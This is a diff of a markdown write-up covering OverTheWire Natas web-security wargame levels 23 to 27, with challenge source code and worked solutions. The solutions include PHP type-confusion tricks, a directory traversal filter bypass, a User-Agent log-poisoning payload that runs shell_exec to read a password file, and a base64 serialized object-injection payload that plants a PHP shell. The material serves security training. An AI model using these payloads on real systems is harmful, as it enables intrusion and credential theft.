@@ -1,6 +1,7 @@
+
 # OverTheWire Natas Solutions
 
-![Code](https://img.shields.io/badge/Code-Markdown-orange?logo=markdown) ![Coverage](https://img.shields.io/badge/Coverage-65%25-lightgreen) ![Status](https://img.shields.io/badge/Status-In_production-green)
+![Code](https://img.shields.io/badge/Code-Markdown-orange?logo=markdown) ![Coverage](https://img.shields.io/badge/Coverage-80%25-lightgreen) ![Status](https://img.shields.io/badge/Status-In_production-green)
 
 This is a collection of solution for the [OverTheWire Natas](https://overthewire.org/wargames/natas/) problems, a collection of 34 levels, each dealing with the basics of web security. All of the levels are found at http://natasX.natas.labs.overthewire.org, where X is the level number. To access each challenge, we need a:
 - Username: `natasX`, where X is the level number.
@@ -34,6 +35,11 @@ Please use these as hints to solve the challenges yourself. Do not use them to c
 - [Level 20](#level20)
 - [Level 21](#level21)
 - [Level 22](#level22)
+- [Level 23](#level23)
+- [Level 24](#level24)
+- [Level 25](#level25)
+- [Level 26](#level26)
+- [Level 27](#level27)
 - [Final Notes](#finalnotes)
 
 ## Level 0 <a name="level0"></a>
@@ -294,7 +300,7 @@ No matter what we try, we never get a valid response. But if we dig deeper, espe
 ```
 So there is a path where the password is stored[^2]. Yet how can we access it when there's no way to move around in a web server? Here comes in play the GET variable from earlier... <br>
 For those who don't use Linux, or aren't familiar to its Shell syntax, to move around folders one can use the command `cd /path_to_folder/`, and to move out, simply `cd ..` where the double dots represent the parent directory to where you are. <br>
-We can use this to out advantage to "escalate" the folder, and reach the desired path in `/etc/natas_webpass/natas8`. After trial and error, one can come up to an URL like this: <br>
+We can use this to out advantage to "escalate" the folder, in a [Directory Traversal Attack](https://cwe.mitre.org/data/definitions/35.html), and reach the desired path in `/etc/natas_webpass/natas8`. After trial and error, one can come up to an URL like this: <br>
 `http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8` <br>
 And there, our password is shown.
 
@@ -1572,7 +1578,7 @@ We have injected our code. Now if we go back to the original site, there are no 
 </html>
 ```
 
-## Level 21 <a name="level21"></a>
+## Level 22 <a name="level22"></a>
 Landing on the site, we see this:
 
 ![Level 22](/imgs/lvl22/screenshot.png)
@@ -1625,6 +1631,555 @@ And we get:
 </html>
 ```
 
+## Level 23 <a name="level23"></a>
+Landing on the site, we see this:
+
+![Level 23](/imgs/lvl23/screenshot.png)
+
+We have a password input. Let's see what the source code does:
+```php
+<?php  
+if(array_key_exists("passwd",$_REQUEST)){  
+	if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){  
+		echo "<br>The credentials for the next level are:<br>";  
+		echo "<pre>Username: natas24 Password: <censored></pre>";  
+	}  
+	else{  
+		echo "<br>Wrong!<br>";  
+	}  
+} 
+?>
+```
+By the looks of it, we need a password that's greater than 10, and has `iloveyou` inside it ([`strstr()`](https://www.php.net/manual/en/function.strstr.php) in PHP returns a part of string containing the substring and the following characters). Additionally, in PHP  strings are compared to integers in a [peculiar way](https://www.php.net/manual/en/language.types.numeric-strings.php):
+>  When a string needs to be evaluated as number (e.g. arithmetic operations, int type declaration, etc.) the following steps are taken to determine the outcome:
+>  - If the string is numeric, resolve to an int if the string is an integer numeric string and fits into the limits of the int type limits (as defined by PHP_INT_MAX), otherwise resolve to a float.
+>  - If the context allows leading numeric strings and the string is one, resolve to an int if the leading part of the string is an integer numeric string and fits into the limits of the int type limits (as defined by PHP_INT_MAX), otherwise resolve to a float. Additionally an error of level E_WARNING is raised.
+>  - The string is not numeric, throw a TypeError.
+
+Thus, we can simply add a random number greater than 10 in the password that contains `iloveyou`, and we get the solution: password = `11iloveyou`
+```html
+<html>
+	<head>
+		...
+	</head>
+	<body>
+		<h1>natas23</h1>
+		<div id="content">
+
+			Password:
+			<form name="input" method="get">
+		    <input type="text" name="passwd" size=20>
+		    <input type="submit" value="Login">
+			</form>
+
+			<br>The credentials for the next level are:<br>
+			<pre>Username: natas24 Password: **** </pre>  
+			<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+		</div>
+	</body>
+</html>
+```
+
+## Level 24 <a name="level24"></a>
+Landing on the site, we see this:
+
+![Level 24](/imgs/lvl24/screenshot.png)
+
+Again, we have another password input. Let's see what the source code does:
+```php
+<?php  
+if(array_key_exists("passwd",$_REQUEST)){  
+	if(!strcmp($_REQUEST["passwd"],"<censored>")){  
+		echo "<br>The credentials for the next level are:<br>";  
+		echo "<pre>Username: natas25 Password: <censored></pre>";  
+	}  
+	else{  
+		echo "<br>Wrong!<br>";  
+	}  
+}    
+?>
+```
+[`strcmp()`](https://www.php.net/manual/en/function.strcmp.php) is a binary-safe string comparison (which means we also have case sensitivity), and it returns:
+> - A value less than 0 if `string1 < string2`
+> - A value greater than 0 if `string1 > string2`
+> - `0` if `string1 == string2`
+
+Now, if we can fool the comparison to always return 0, we can access the solution. This type of attack is called [Type Confusion](https://cwe.mitre.org/data/definitions/843.html), where:
+> When the product accesses the resource using an incompatible type, this could trigger logical errors because the resource does not have expected properties.
+
+In PHP it has been found that type confusion in `strcmp()` is done by passing an array as argument, which by default returns 0. Since there is no sanitization on the password, we can input `&passwd[]=test`, and we get the solution:
+```html
+<html>
+	<head>
+		...
+	</head>
+	<body>
+		<h1>natas24</h1>
+		<div id="content">
+
+			Password:
+			<form name="input" method="get">
+		    <input type="text" name="passwd" size=20>
+		    <input type="submit" value="Login">
+			</form>
+
+			<br />
+			<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
+			<br>The credentials for the next level are:<br>
+			<pre>Username: natas25 Password: ****</pre>  
+			<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+		</div>
+	</body>
+</html>
+```
+
+## Level 25 <a name="level25"></a>
+Landing on the site, we see this:
+
+![Level 25](/imgs/lvl25/screenshot.png)
+
+Some kind of pessimistic quotation from "The Scientist", a character in the 1993 movie [Bad Boy Bubby](https://en.wikipedia.org/wiki/Bad_Boy_Bubby). But that's not important here. We can change the language of the page to German and English. Let's look at the source code:
+```php
+<?php  
+function setLanguage(){  
+	/* language setup */  
+	if(array_key_exists("lang",$_REQUEST))  
+		if(safeinclude("language/" . $_REQUEST["lang"] )) return 1;  
+	safeinclude("language/en");  
+}  
+  
+function safeinclude($filename){  
+	// check for directory traversal  
+	if(strstr($filename,"../")){  
+		logRequest("Directory traversal attempt! fixing request.");  
+		$filename=str_replace("../","",$filename);  
+	}  
+	// dont let ppl steal our passwords  
+	if(strstr($filename,"natas_webpass")){  
+		logRequest("Illegal file access detected! Aborting!");  
+		exit(-1);  
+	}  
+	// add more checks...  
+  
+	if (file_exists($filename)) {  
+		include($filename);  
+		return 1;  
+	}  
+	return 0;  
+}  
+  
+function listFiles($path){  
+	$listoffiles=array();  
+	if ($handle = opendir($path))  
+		while (false !== ($file = readdir($handle)))  
+			if ($file != "." && $file != "..")  
+				$listoffiles[]=$file;  
+  
+closedir($handle);  
+return $listoffiles;  
+}  
+  
+function logRequest($message){  
+	$log="[". date("d.m.Y H::i:s",time()) ."]";  
+	$log=$log . " " . $_SERVER['HTTP_USER_AGENT'];  
+	$log=$log . " \"" . $message ."\"\n";  
+	$fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");  
+	fwrite($fd,$log);  
+	fclose($fd);  
+}  
+?>  
+  
+<h1>natas25</h1>  
+<div id="content">  
+<div align="right">  
+<form>  
+<select name='lang' onchange='this.form.submit()'>  
+<option>language</option>  
+<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>  
+</select>  
+</form>  
+</div>  
+  
+<?php  
+session_start();  
+setLanguage();  
+  
+echo "<h2>$__GREETING</h2>";  
+echo "<p align=\"justify\">$__MSG";  
+echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";  
+?>
+```
+While they tried to avoid [Directory Traversal Attack](https://cwe.mitre.org/data/definitions/35.html) by "sanitizing" the `lang` field, we can easily bypass it: it first checks if `../` is present in the value, and then removes it, but we can say `....//`, which becomes `../` after sanitization, and move around. Let's try it: <br>
+`http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//etc/`
+
+![Traversal](/imgs/lvl25/traversal.png)
+
+Easy enough. Now, we have a problem, since it also sanitizes the path we need to take to go to the solution for the level. <br>
+Since this approach was indeed to easy, we need to look at the code better: we have the full path where the log file is, and it writes in the [`HTTP_USER_AGENT`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/User-Agent) request parameter? That looks vulnerable enough that we can load code and execute it inside the file. We're going to modify the `HTTP_USER_AGENT` to display the password for the next level, and then move to the log to see it. 
+Let's go to the log file, located at `/var/www/natas/natas25/logs/natas25_" . session_id() .".log"`, and we can see our session ID in the cookies. Then, we're going to write some PHP code in the header like `<?php echo "Password is: " . shell_exec("cat /etc/natas_webpass/natas26"); ?>`. Run it, and we have the password:
+
+![Solution](/imgs/lvl25/solution.png)
+
+```html
+<html>
+	<head>
+		...
+	</head>
+	<body>
+
+	<h1>natas25</h1>
+		<div id="content">
+			<div align="right">
+				<form>
+					<select name='lang' onchange='this.form.submit()'>
+					<option>language</option>
+					<option>de</option><option>en</option></select>
+				</form>
+			</div>
+
+			***
+			[d.m.y h::m:s] Password is: ****
+			"Directory traversal attempt! fixing request."
+			<br />
+			<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
+			<h2></h2><br />
+			<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
+			<p align="justify"><br />
+			<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> 		on line <b>82</b><br />
+			<div align="right"><h6></h6><div><p>
+			<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+		</div>
+	</body>
+</html>
+```
+
+## Level 26 <a name="level26"></a>
+Landing on the site, we see this:
+
+![Level 26](/imgs/lvl26/screenshot.png)
+
+A line drawer, where we can input the coordinates. Let's look at the source code:
+```php
+<?php 
+  
+class Logger{  
+	private $logFile;  
+	private $initMsg;  
+	private $exitMsg;  
+  
+	function __construct($file){  
+		// initialise variables  
+		$this->initMsg="#--session started--#\n";  
+		$this->exitMsg="#--session end--#\n";  
+		$this->logFile = "/tmp/natas26_" . $file . ".log";  
+  
+		// write initial message  
+		$fd=fopen($this->logFile,"a+");  
+		fwrite($fd,$this->initMsg);  
+		fclose($fd);  
+	}  
+  
+	function log($msg){  
+		$fd=fopen($this->logFile,"a+");  
+		fwrite($fd,$msg."\n");  
+		fclose($fd);  
+	}  
+  
+	function __destruct(){  
+		// write exit message  
+		$fd=fopen($this->logFile,"a+");  
+		fwrite($fd,$this->exitMsg);  
+		fclose($fd);  
+	}  
+}  
+  
+function showImage($filename){  
+	if(file_exists($filename))  echo "<img src=\"$filename\">";  
+}  
+  
+function drawImage($filename){  
+	$img=imagecreatetruecolor(400,300);  
+	drawFromUserdata($img);  
+	imagepng($img,$filename);  
+	imagedestroy($img);  
+}  
+  
+function drawFromUserdata($img){  
+	if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&  
+array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){  
+  
+		$color=imagecolorallocate($img,0xff,0x12,0x1c);  
+		imageline($img,$_GET["x1"], $_GET["y1"],  
+		$_GET["x2"], $_GET["y2"], $color);  
+	}  
+  
+	if (array_key_exists("drawing", $_COOKIE)){  
+		$drawing=unserialize(base64_decode($_COOKIE["drawing"]));  
+		if($drawing)  
+			foreach($drawing as $object)  
+				if( array_key_exists("x1", $object) && 
+array_key_exists("y1", $object) &&  
+array_key_exists("x2", $object) &&  
+array_key_exists("y2", $object)){  
+  
+					$color=imagecolorallocate($img,0xff,0x12,0x1c);  
+					imageline($img,$object["x1"],$object["y1"],  
+					$object["x2"] ,$object["y2"] ,$color);  
+  
+				}  
+	}  
+}  
+  
+function storeData(){  
+	$new_object=array();  
+  
+	if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&  
+array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){  
+		$new_object["x1"]=$_GET["x1"];  
+		$new_object["y1"]=$_GET["y1"];  
+		$new_object["x2"]=$_GET["x2"];  
+		$new_object["y2"]=$_GET["y2"];  
+	}  
+  
+	if (array_key_exists("drawing", $_COOKIE)){  
+		$drawing=unserialize(base64_decode($_COOKIE["drawing"]));  
+	}  
+	else{  
+		// create new array  
+		$drawing=array();  
+	}  
+  
+	$drawing[]=$new_object;  
+	setcookie("drawing",base64_encode(serialize($drawing)));  
+}  
+?>  
+  
+<h1>natas26</h1>  
+<div id="content">  
+  
+Draw a line:<br>  
+<form name="input" method="get">  
+X1<input type="text" name="x1" size=2>  
+Y1<input type="text" name="y1" size=2>  
+X2<input type="text" name="x2" size=2>  
+Y2<input type="text" name="y2" size=2>  
+<input type="submit" value="DRAW!">  
+</form>  
+  
+<?php  
+session_start();  
+  
+if (array_key_exists("drawing", $_COOKIE) ||  
+( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&  
+array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
+	$imgfile="img/natas26_" . session_id() .".png";  
+	drawImage($imgfile);  
+	showImage($imgfile);  
+	storeData();  
+}
+?>
+```
+A lot of code, but a line catches the attention: `$drawing=unserialize(base64_decode($_COOKIE["drawing"]))`, which means inside the cookie we have information about the drawing. In fact, we have `drawing=YToyOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjEiO3M6MjoieTEiO3M6MToiMSI7czoyOiJ4MiI7czoyOiIxMCI7czoyOiJ5MiI7czoyOiIxMCI7fWk6MTthOjQ6e3M6MjoieDEiO3M6MToiMSI7czoyOiJ5MSI7czoxOiIxIjtzOjI6IngyIjtzOjI6IjEwIjtzOjI6InkyIjtzOjM6IjEwMCI7fX0%3D`, where `%3D` is an equal sign. If we decode it by running the function in a script or online editor, we get:
+```txt
+Array
+(
+    [0] => Array
+        (
+            [x1] => 1
+            [y1] => 1
+            [x2] => 10
+            [y2] => 10
+        )
+
+    [1] => Array
+        (
+            [x1] => 1
+            [y1] => 1
+            [x2] => 10
+            [y2] => 100
+        )
+
+)
+```
+Which are the points we've inputted in the site. If we can input malicious code, and be deserialized into the PHP file, we can print the password and get to the next level. This attack is called [Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html). <br>
+What we can change is the class `Logger`, in a [PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection):
+> In PHP, an OOP language, a class may have [magic methods](https://www.php.net/manual/en/language.oop5.magic.php) such as `__construct`, `__deconstruct`, `__sleep` ,etc...  Following the Object Oriented Programming rules, when run, a class initializes calling its constructor, then is destroyed by its deconstructor. By using `unserialize()` we can modify the code of a class' magic method to run malicious code. To do so, the following prerequisite must be met:
+> -   The application must have a class which implements a PHP magic method that can be used to carry out malicious attacks, or to start a “POP chain”.
+> -   All of the classes used during the attack must be declared when the vulnerable `unserialize()` is being called, otherwise object autoloading must be supported for such classes.
+
+Which means, as long as we have an `unserialize()` inside the same file as a class, we can modify its behavior to run ad-hoc code. In our case, we write to the log file inside the `Logger` class, which writes `$initMsg` and `exitMsg` in its constructor `__construct`. But what if the messages we write is a simple echo of our password in a custom file `shell.php`, as such?
+```php
+class Logger{
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+
+    function __construct($file){
+        $this->initMsg="We're in\n";
+        $this->exitMsg="<?php echo \"Password is: \" . shell_exec(\"cat /etc/natas_webpass/natas26\"); ?>\n";
+        $this->logFile = "/img/shell.php";
+        $fd=fopen($this->logFile,"a+");
+        fwrite($fd,$this->initMsg);
+        fclose($fd);
+    }
+}
+```
+Since we unserialize the cookie, which contains `drawing`, we need to "pack it up" following the reverse order, so that it can be sent and then decoded:
+```php
+<?php
+class Logger{
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+
+    function __construct($file){
+        $this->initMsg="We're in\n";
+        $this->exitMsg="<?php echo shell_exec(\"cat /etc/natas_webpass/natas26\"); ?>\n";
+        $this->logFile = "/img/shell.php";
+    }
+}
+$custom_class = new Logger("unpwnabl");
+$payload = base64_encode(serialize($custom_class));
+print_r($payload);
+?>
+```
+What we get is `Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiL2ltZy9zaGVsbC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo5OiJXZSdyZSBpbgoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo3ODoiPD9waHAgZWNobyAiUGFzc3dvcmQgaXM6ICIgLiBzaGVsbF9leGVjKCJjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjYiKTsgPz4KIjt9`, that we can put inside our cookies. Then, if we go to `http://natas26.natas.labs.overthewire.org/img/shell.php` we should see our password:
+```html
+<br />
+<b>Notice</b>:  Undefined index: cmd in <b>/var/www/natas/natas26/img/shell.php</b> on line <b>1</b><br />
+<br />
+<b>Warning</b>:  system(): Cannot execute a blank command in <b>/var/www/natas/natas26/img/shell.php</b> on line <b>1</b><br />
+****
+
+<br />
+<b>Fatal error</b>:  Uncaught Error: Call to undefined function pasthru() in /var/www/natas/natas26/img/shell.php:6
+Stack trace:
+#0 {main}
+  thrown in <b>/var/www/natas/natas26/img/shell.php</b> on line <b>6</b><br />
+```
+Not the prettiest output, but it works.
+
+## Level 27 <a name="level27"></a>
+Landing on the site, we see this:
+
+![Level 27](/imgs/lvl27/screenshot.png)
+
+Again, another login. Let's look at the source code:
+```php
+<?php
+// database gets cleared every 5 min  
+  
+  
+/*  
+CREATE TABLE `users` (  
+`username` varchar(64) DEFAULT NULL,  
+`password` varchar(64) DEFAULT NULL  
+);  
+*/  
+  
+  
+function checkCredentials($link,$usr,$pass){  
+  
+	$user=mysqli_real_escape_string($link, $usr);  
+	$password=mysqli_real_escape_string($link, $pass);  
+  
+	$query = "SELECT username from users where username='$user' and password='$password' ";  
+	$res = mysqli_query($link, $query);  
+	if(mysqli_num_rows($res) > 0){  
+		return True;  
+	}  
+	return False;  
+}  
+  
+  
+function validUser($link,$usr){  
+  
+	$user=mysqli_real_escape_string($link, $usr);  
+  
+	$query = "SELECT * from users where username='$user'";  
+	$res = mysqli_query($link, $query);  
+	if($res) {  
+		if(mysqli_num_rows($res) > 0) {  
+			return True;  
+		}  
+	}  
+	return False;  
+}  
+  
+  
+function dumpData($link,$usr){  
+  
+	$user=mysqli_real_escape_string($link, trim($usr));  
+  
+	$query = "SELECT * from users where username='$user'";  
+	$res = mysqli_query($link, $query);  
+	if($res) {  
+		if(mysqli_num_rows($res) > 0) {  
+			while ($row = mysqli_fetch_assoc($res)) {  
+				// thanks to Gobo for reporting this bug!  
+				//return print_r($row);  
+				return print_r($row,true);  
+			}  
+		}  
+	}  
+	return False;  
+}  
+  
+  
+function createUser($link, $usr, $pass){  
+  
+	if($usr != trim($usr)) {  
+		echo "Go away hacker";  
+		return False;  
+	}  
+	$user=mysqli_real_escape_string($link, substr($usr, 0, 64));  
+	$password=mysqli_real_escape_string($link, substr($pass, 0, 64));  
+  
+	$query = "INSERT INTO users (username,password) values ('$user','$password')";  
+	$res = mysqli_query($link, $query);  
+	if(mysqli_affected_rows($link) > 0){  
+		return True;  
+	}  
+	return False;  
+}  
+  
+  
+if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {  
+	$link = mysqli_connect('localhost', 'natas27', '<censored>');  
+	mysqli_select_db($link, 'natas27');  
+  
+  
+	if(validUser($link,$_REQUEST["username"])) {  
+		//user exists, check creds  
+		if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){  
+			echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";  
+			echo "Here is your data:<br>";  
+			$data=dumpData($link,$_REQUEST["username"]);  
+			print htmlentities($data);  
+		}  
+		else{  
+			echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";  
+		}  
+	}  
+	else {  
+		//user doesn't exist  
+		if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){  
+			echo "User " . htmlentities($_REQUEST["username"]) . " was created!";  
+		}  
+	}  
+  
+	mysqli_close($link);  
+} else {  
+?>  
+  
+<form action="index.php" method="POST">  
+Username: <input name="username"><br>  
+Password: <input name="password" type="password"><br>  
+<input type="submit" value="login" />  
+</form>  
+<?php } ?>
+```
+
 ## Final Notes <a name="finalnotes"></a>
 This project is under the [GPL-3.0 License](https://www.gnu.org/licenses/gpl-3.0.html). Any use or distribution is completely free, unless edited. <br>
 [OverTheWire Natas](https://overthewire.org/wargames/natas/), its challenges and solutions are all under their domain. I claim nothing. If you liked the challenges, please consider [donating](https://overthewire.org/information/donate.html) to them. <br>
@@ -1639,3 +2194,4 @@ Main contributors: <br>
 [^3]: \- `convert` is part of [ImageMagick](https://github.com/ImageMagick/ImageMagick), necessary to have a smaller image (9x9 is a arbitrary dimension I chose). <br>
 \- `>>` redirect stdout to file. <br>
 \- Thanks to [Synactivy](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there)  for the explanation and some commands.
+
